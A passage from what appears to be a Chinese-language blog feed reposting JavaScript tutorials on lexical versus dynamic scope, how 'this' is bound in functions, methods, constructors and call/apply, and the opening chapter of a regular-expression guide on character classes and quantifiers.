function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "middle"</span>  <span class="token keyword">function</span> <span class="token function">innerFun</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "inner"</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">innerFun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">afun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// "outer"</span></code></pre><p><strong>当我们要使用声明的变量时：JS引擎总会从最近的一个域，向外层域查找；</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce92a304bc47?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>再举一个一个实际的例子：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "outer"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 个人理解词法作用于是基于代码定义的</span></code></pre><p><strong>显然，当 JS 引擎查找这个变量时，发现全局的 testValue 离得更近一些，这恰好和 动态作用域 相反；</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce99fad0f0ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>如上图所示，下面将讲述与 词法作用域相反的动态作用域；</p><h3 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h3><p>在编程中，最容易被低估和滥用的概念就是动态作用域（《JavaScript函数式编程》）。</p><p>在 JavaScript 中的仅存的应用动态作用域的地方：<code>this</code> 引用，所以这是一个大坑！！！！！</p><blockquote><p>动态作用域，作用域是基于调用栈的，而不是代码中的作用域嵌套；</p><p>作用域嵌套，有词法作用域一样的特性，查找变量时，总是寻找最近的作用域；</p></blockquote><p>同样是，词法作用域，例子2，同一份代码，<strong>如果</strong> 是动态作用域：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>testValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "inner"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> testValue <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>  <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>当然，JavaScript 除了this之外，其他，都是根据词法作用域查找！！！</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce78d69108cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>为什么要理解动态作用域呢？因为，这能让你更好地学习 <code>this</code> 引用！！！</p><p> 要清楚，JavaScript 实际上没有动态作用域。它拥有词法作用域。就这么简单。但是 <code>this</code> 机制有些像动态作用域。</p><p>关键的差异：词法作用域是编写时的，而动态作用域（和 <code>this</code>）是运行时的。词法作用域关心的是 <em>函数在何处被声明</em>，但是动态作用域关心的是函数 <em>从何处</em> 被调用。</p><p>作者：leiting1998<br>链接：<a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">https://juejin.im/post/5abb99e9f265da2392366824</a><br>来源：掘金</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javascript中this的指向</title>
      <link href="2018/10/31/JavaScript-JS%E4%B8%ADthis%E7%9A%84%E6%8C%87%E5%90%91/"/>
      <url>2018/10/31/JavaScript-JS%E4%B8%ADthis%E7%9A%84%E6%8C%87%E5%90%91/</url>
      
        <content type="html"><![CDATA[<ul><li><p>以函数的形式调用时，<strong>this</strong>指向的是<strong>window</strong></p></li><li><p>以方法的形式调用时，this就是调用方法的那个对象</p></li><li><p>当以构造函数的形式调用时，this就是新创建的那个对象</p></li><li><p>使用call()和apply()调用时，this就是call()和apply()第一个参数的对象</p></li><li><p>使用bind()()调用时，this就是bind()第一个参数的对象</p></li><li><p>箭头函数的 this 始终指向函数定义时的 this，而非执行时。</p></li></ul><h1 id="this的指向"><a href="#this的指向" class="headerlink" title="this的指向"></a>this的指向</h1><ol><li>普通函数指向函数的调用者</li></ol><blockquote><p>有个简便的方法就是看函数前面有没有点,如果有点,那么就指向点前面的那个值;<br>也就是说this的指向在函数定义的时候是确定不了的，只有函数执行的时候才能确定this到底指向谁，实际上this的最终指向的是那个调用它的对象 </p></blockquote><ol start="2"><li>箭头函数指向函数所在的所用域:</li></ol><blockquote><p>注意理解作用域,只有函数的{}构成作用域,对象的{}以及 if(){}都不构成作用域;</p></blockquote><h2 id="1-普通函数与箭头函数this指向的区别"><a href="#1-普通函数与箭头函数this指向的区别" class="headerlink" title="1.普通函数与箭头函数this指向的区别"></a>1.普通函数与箭头函数this指向的区别</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'objName'</span><span class="token punctuation">,</span>    <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    read<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>obj<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// objName,函数被obj对象调用，所以this指向obj</span>obj<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// undefined，此时函数的作用域为全局环境，window.name未定义</span></code></pre><h2 id="2-普通函数与作为对象方法函数this指向的区别"><a href="#2-普通函数与作为对象方法函数this指向的区别" class="headerlink" title="2.普通函数与作为对象方法函数this指向的区别"></a>2.普通函数与作为对象方法函数this指向的区别</h2><pre class=" language-js"><code class="language-js">window<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    val<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    dbl<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        val <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//作为对象方法</span>obj<span class="token punctuation">.</span><span class="token function">dbl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2 4,this指的是obj，所以this.val值为4，val相当于window.val值为2</span><span class="token comment" spellcheck="true">//普通函数</span><span class="token keyword">var</span> func <span class="token operator">=</span> obj<span class="token punctuation">.</span>dbl<span class="token punctuation">;</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 8 8，func()没有任何前缀，this指的是window.func();所以此时this值得是window，值均为8</span></code></pre><h2 id="3-如何解决函数体内的函数绑定到全局对象的问题"><a href="#3-如何解决函数体内的函数绑定到全局对象的问题" class="headerlink" title="3.如何解决函数体内的函数绑定到全局对象的问题"></a>3.如何解决函数体内的函数绑定到全局对象的问题</h2><p>我们希望在 moveTo 方法内定义两个函数，分别将 x，y 坐标进行平移。结果可能出乎大家意料，不仅 point 对象没有移动，反而多出两个全局变量 x，y。 </p><pre class=" language-js"><code class="language-js">        <span class="token keyword">var</span> point <span class="token operator">=</span> <span class="token punctuation">{</span>             x <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>             y <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>             moveTo <span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token keyword">var</span> moveX <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>                     <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>                 <span class="token keyword">var</span> moveY <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//moveX(x)函数前面没有对象，默认为window.moveX(x),所以this指向window</span>               <span class="token function">moveX</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">moveY</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span><span class="token punctuation">;</span>         point<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//==>0 </span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//==>0 </span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//==>1 </span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//==>1</span></code></pre><p>这属于 JavaScript 的设计缺陷，正确的设计方式是内部函数的 this 应该绑定到其外层函数对应的对象上，为了规避这一设计缺陷，聪明的 JavaScript 程序员想出了变量替代的方法，约定俗成，该变量一般被命名为 that。 </p><pre class=" language-js"><code class="language-js">        <span class="token keyword">var</span> point <span class="token operator">=</span> <span class="token punctuation">{</span>             x <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>             y <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>             moveTo <span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token comment" spellcheck="true">//调用move函数To的对象为point,所以这里的that和this指向point</span>                <span class="token keyword">var</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>                 <span class="token keyword">var</span> moveX <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>                     that<span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>                 <span class="token punctuation">}</span><span class="token punctuation">;</span>                 <span class="token keyword">var</span> moveY <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token punctuation">{</span>                     that<span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>                 <span class="token punctuation">}</span>                 <span class="token function">moveX</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">moveY</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span><span class="token punctuation">;</span>         point<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         point<span class="token punctuation">.</span>x<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//==>1 </span>        point<span class="token punctuation">.</span>y<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//==>1</span></code></pre><h2 id="构造函数中this的指向"><a href="#构造函数中this的指向" class="headerlink" title="构造函数中this的指向"></a>构造函数中this的指向</h2><p>JavaScript 支持面向对象式编程，与主流的面向对象式编程语言不同，JavaScript 并没有类（class）的概念，而是使用基于原型（prototype）的继承方式。相应的，JavaScript 中的构造函数也很特殊，如果不使用 new 调用，则和普通函数一样。作为又一项约定俗成的准则，构造函数以大写字母开头，提醒调用者使用正确的方式调用。如果调用正确，this 绑定到新创建的对象上。 </p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Point</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//==>1,this指向对象p</span></code></pre><h2 id="5-apply或call调用"><a href="#5-apply或call调用" class="headerlink" title="5. apply或call调用"></a>5. apply或call调用</h2><p>在 JavaScript 中函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法。这两个方法异常强大，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象。很多 JavaScript 中的技巧以及类库都用到了该方法。 </p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Point</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>moveTo <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> p1<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> p1<span class="token punctuation">.</span>moveTo<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在上面的例子中，我们使用构造函数生成了一个对象 p1，该对象同时具有 moveTo 方法；使用对象字面量创建了另一个对象 p2，我们看到使用 apply 可以将 p1 的方法应用到 p2 上，这时候 this 也被绑定到对象 p2 上。另一个方法 call 也具备同样功能，不同的是最后的参数不是作为一个数组统一传入，而是分开传入的。 </p><p>部分转载自<a href="https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/index.html，" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/index.html，</a></p><p><a href="https://juejin.im/post/5a0d9ff4f265da432e5b91da" target="_blank" rel="noopener">https://juejin.im/post/5a0d9ff4f265da432e5b91da</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="2018/10/03/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>2018/10/03/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="JS正则表达式完整教程（略长）"><a href="#JS正则表达式完整教程（略长）" class="headerlink" title="JS正则表达式完整教程（略长）"></a>JS正则表达式完整教程（略长）</h1><p>转载自<a href="https://juejin.im/post/5965943ff265da6c30653879" target="_blank" rel="noopener">https://juejin.im/post/5965943ff265da6c30653879</a></p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>亲爱的读者朋友，如果你点开了这篇文章，说明你对正则很感兴趣。</p><p>想必你也了解正则的重要性，在我看来正则表达式是衡量程序员水平的一个侧面标准。</p><p>关于正则表达式的教程，网上也有很多，相信你也看了一些。</p><p>与之不同的是，本文的目的是希望所有认真读完的童鞋们，都有实质性的提高。</p><p>本文内容共有七章，用JavaScript语言完整地讨论了正则表达式的方方面面。</p><p>如果觉得文章某块儿没有说明白清楚，欢迎留言，能力范围之内，老姚必做详细解答。</p><p>具体章节如下：</p><ul><li>引言</li><li>第一章 正则表达式字符匹配攻略</li><li>第二章 正则表达式位置匹配攻略</li><li>第三章 正则表达式括号的作用</li><li>第四章 正则表达式回溯法原理</li><li>第五章 正则表达式的拆分</li><li>第六章 正则表达式的构建</li><li>第七章 正则表达式编程</li><li>后记</li></ul><p>下面简单地说说每一章都讨论了什么？</p><p><strong>正则是匹配模式，要么匹配字符，要么匹配位置。</strong></p><p>第1章和第2章以这个角度去讲解了正则的基础。</p><p><strong>在正则中可以使用括号捕获数据，要么在API中进行分组引用，要么在正则里进行反向引用。</strong></p><p>这是第3章的主题，讲解了正则中括号的作用。</p><p><strong>学习正则表达式，是需要了解其匹配原理的。</strong></p><p>第4章，讲解了正则了正则表达式的回溯法原理。另外在第6章里，也讲解了正则的表达式的整体工作原理。</p><p><strong>不仅能看懂别人的正则，还要自己会写正则。</strong></p><p>第5章，是从读的角度，去拆分一个正则表达式，而第6章是从写的角度，去构建一个正则表达式。</p><p><strong>学习正则，是为了在真实世界里应用的。</strong></p><p>第7章讲解了正则的用法，和相关API需要注意的地方。</p><p><strong>如何阅读本文？</strong></p><p>我的建议是阅读两遍。第一遍，不求甚解地快速阅读一遍。阅读过程中遇到的问题不妨记录下来，也许阅读完毕后就能解决很多。然后有时间的话，再带着问题去精读第二遍。</p><p>深呼吸，开始我们的正则表达式旅程吧。我在终点等你。</p><h2 id="第一章-正则表达式字符匹配攻略"><a href="#第一章-正则表达式字符匹配攻略" class="headerlink" title="第一章 正则表达式字符匹配攻略"></a>第一章 正则表达式字符匹配攻略</h2><p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。请记住这句话。</p><p>然而关于正则如何匹配字符的学习，大部分人都觉得这块比较杂乱。</p><p>毕竟元字符太多了，看起来没有系统性，不好记。本章就解决这个问题。</p><p>内容包括：</p><ol><li>两种模糊匹配</li><li>字符组</li><li>量词</li><li>分支结构</li><li>案例分析</li></ol><h3 id="1-两种模糊匹配"><a href="#1-两种模糊匹配" class="headerlink" title="1 两种模糊匹配"></a>1 两种模糊匹配</h3><p>如果正则只有精确匹配是没多大意义的，比如<code>/hello/</code>，也只能匹配字符串中的”hello”这个子串。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/hello/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p>正则表达式之所以强大，是因为其能实现模糊匹配。</p><p>而模糊匹配，有两个方向上的“模糊”：横向模糊和纵向模糊。</p><p><strong>1.1 横向模糊匹配</strong></p><p>横向模糊指的是，一个正则可匹配的字符串的长度不是固定的，可以是多种情况的。</p><p>其实现的方式是使用量词。譬如<code>{m,n}</code>，表示连续出现最少m次，最多n次。</p><p>比如<code>/ab{2,5}c/</code>表示匹配这样一个字符串：第一个字符是“a”，接下来是2到5个字符“b”，最后是字符“c”。测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/ab{2,5}c/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"abc abbc abbbc abbbbc abbbbbc abbbbbbc"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["abbc", "abbbc", "abbbbc", "abbbbbc"]</span>复制代码</code></pre><p>注意：案例中用的正则是<code>/ab{2,5}c/g</code>，后面多了<code>g</code>，它是正则的一个修饰符。表示全局匹配，即在目标字符串中按顺序找到满足匹配模式的所有子串，强调的是“所有”，而不只是“第一个”。g是单词global的首字母。</p><p><strong>1.2 纵向模糊匹配</strong></p><p>纵向模糊指的是，一个正则匹配的字符串，具体到某一位字符时，它可以不是某个确定的字符，可以有多种可能。</p><p>其实现的方式是使用字符组。譬如<code>[abc]</code>，表示该字符是可以字符“a”、“b”、“c”中的任何一个。</p><p>比如<code>/a[123]b/</code>可以匹配如下三种字符串：”a1b”、”a2b”、”a3b”。测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/a[123]b/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"a0b a1b a2b a3b a4b"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => ["a1b", "a2b", "a3b"]</span>复制代码</code></pre><p>以上就是本章讲的主体内容，只要掌握横向和纵向模糊匹配，就能解决很大部分正则匹配问题。</p><p>接下来的内容就是展开说了，如果对此都比较熟悉的话，可以跳过，直接看本章案例那节。</p><h3 id="2-字符组"><a href="#2-字符组" class="headerlink" title="2. 字符组"></a>2. 字符组</h3><p>需要强调的是，虽叫字符组（字符类），但只是其中一个字符。例如<code>[abc]</code>，表示匹配一个字符，它可以是“a”、“b”、“c”之一。</p><p><strong>2.1 范围表示法</strong></p><p>如果字符组里的字符特别多的话，怎么办？可以使用范围表示法。</p><p>比如<code>[123456abcdefGHIJKLM]</code>，可以写成<code>[1-6a-fG-M]</code>。用连字符<code>-</code>来省略和简写。</p><p>因为连字符有特殊用途，那么要匹配“a”、“-”、“z”这三者中任意一个字符，该怎么做呢？</p><p>不能写成<code>[a-z]</code>，因为其表示小写字符中的任何一个字符。</p><p>可以写成如下的方式：<code>[-az]</code>或<code>[az-]</code>或<code>[a\-z]</code>。即要么放在开头，要么放在结尾，要么转义。总之不会让引擎认为是范围表示法就行了。</p><p><strong>2.2 排除字符组</strong></p><p>纵向模糊匹配，还有一种情形就是，某位字符可以是任何东西，但就不能是”a”、”b”、”c”。</p><p>此时就是排除字符组（反义字符组）的概念。例如<code>[^abc]</code>，表示是一个除”a”、”b”、”c”之外的任意一个字符。字符组的第一位放<code>^</code>（脱字符），表示求反的概念。</p><p>当然，也有相应的范围表示法。</p><p><strong>2.3 常见的简写形式</strong></p><p>有了字符组的概念后，一些常见的符号我们也就理解了。因为它们都是系统自带的简写形式。</p><blockquote><p><strong>\d</strong>就是<code>[0-9]</code>。表示是一位数字。记忆方式：其英文是digit（数字）。</p><p><strong>\D</strong>就是<code>[^0-9]</code>。表示除数字外的任意字符。</p><p><strong>\w</strong>就是<code>[0-9a-zA-Z_]</code>。表示数字、大小写字母和下划线。记忆方式：w是word的简写，也称单词字符。</p><p><strong>\W</strong>是<code>[^0-9a-zA-Z_]</code>。非单词字符。</p><p><strong>\s</strong>是<code>[ \t\v\n\r\f]</code>。表示空白符，包括空格、水平制表符、垂直制表符、换行符、回车符、换页符。记忆方式：s是space character的首字母。</p><p><strong>\S</strong>是<code>[^ \t\v\n\r\f]</code>。 非空白符。</p><p><strong>.</strong>就是<code>[^\n\r\u2028\u2029]</code>。通配符，表示几乎任意字符。换行符、回车符、行分隔符和段分隔符除外。记忆方式：想想省略号…中的每个点，都可以理解成占位符，表示任何类似的东西。</p></blockquote><p>如果要匹配任意字符怎么办？可以使用<code>[\d\D]</code>、<code>[\w\W]</code>、<code>[\s\S]</code>和<code>[^]</code>中任何的一个。</p><h3 id="3-量词"><a href="#3-量词" class="headerlink" title="3. 量词"></a>3. 量词</h3><p>量词也称重复。掌握<code>{m,n}</code>的准确含义后，只需要记住一些简写形式。</p><p><strong>3.1 简写形式</strong></p><blockquote><p><code>**{m,}**</code> 表示至少出现m次。</p><p><code>**{m}**</code> 等价于<code>{m,m}</code>，表示出现m次。</p><p><code>**?**</code> 等价于<code>{0,1}</code>，表示出现或者不出现。记忆方式：问号的意思表示，有吗？</p><p><code>**+**</code>等价于<code>{1,}</code>，表示出现至少一次。记忆方式：加号是追加的意思，得先有一个，然后才考虑追加。</p><p><code>*****</code> 等价于<code>{0,}</code>，表示出现任意次，有可能不出现。记忆方式：看看天上的星星，可能一颗没有，可能零散有几颗，可能数也数不过来。</p></blockquote><p><strong>3.2 贪婪匹配和惰性匹配</strong></p><p>看如下的例子：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\d{2,5}/g</span><span class="token punctuation">;</span><span class="token keyword">var</span> string <span 